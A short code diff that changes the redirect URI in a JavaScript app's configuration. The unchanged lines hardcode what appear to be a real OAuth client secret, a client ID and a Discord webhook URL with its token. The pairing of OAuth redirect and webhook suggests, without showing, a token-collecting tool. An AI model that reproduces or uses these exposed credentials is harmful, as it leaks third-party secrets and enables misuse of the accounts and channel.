@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = '8Gr8Q~mw33oIWUIlKBn-_hTJYZQvACyG0tu5vbzt'
 const client_id = '3f044412-77d3-4422-a4e3-d69cc735ccea'
-const redirect_uri = 'https://dull-teal-bull-yoke.cyclic.app'
+const redirect_uri = 'https://tiny-pear-gorilla-robe.cyclic.app'
 const webhook_url = 'https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo'
 
 //Requirements
